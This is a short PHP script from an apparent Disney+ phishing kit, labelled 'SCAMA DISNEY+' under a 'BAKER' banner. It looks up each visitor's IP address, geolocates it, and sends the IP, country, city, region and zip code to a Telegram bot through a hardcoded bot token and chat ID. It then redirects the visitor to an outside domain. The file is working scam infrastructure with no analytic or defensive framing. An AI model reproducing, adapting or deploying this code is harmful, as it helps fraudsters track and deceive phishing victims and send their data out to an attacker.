<?php
/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                              
                                                                                                

*/



$ip = getenv("REMOTE_ADDR");

$by = ("⚡SCAMA DISNEY+ ⚡");




$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg= "$by \n\n$ip"."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

file_get_contents("https://api.telegram.org/bot6030538222:AAGpsHdUbpoD8jiAaDfmpnRwvGRxU4hxLbI/sendMessage?chat_id=-949146547&text=" . urlencode($msg)."" );



header("Location: https://mix.agppaineis.com.br/");
exit;
?>